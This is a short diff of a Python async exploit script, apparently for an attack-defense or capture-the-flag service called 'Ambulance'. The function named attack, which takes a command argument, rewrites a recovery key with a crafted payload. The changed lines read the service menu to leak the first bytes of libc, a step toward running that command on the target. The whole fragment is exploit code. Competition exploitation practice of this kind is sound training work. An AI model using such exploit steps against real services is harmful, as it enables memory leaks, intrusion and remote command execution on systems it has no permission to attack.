@@ -99,10 +99,12 @@ async def attack(io: api.Ambulance, cmd: str) -> None:
     await io.change_recovery_key(payload_password, '')
     print('rewrited list')
 
-    _, (name, disease) = await io.print_info()
+    await io.read_user_menu()
+    await io.read_prompt()
+    await io.writeline(b'1')
     print('leaked libc first bytes')
-    print(repr(name))
-    print(repr(disease))
+    print(repr(await io.readline()))
+    print(repr(await io.readline()))
 
     await io.logout()
     time.sleep(1)
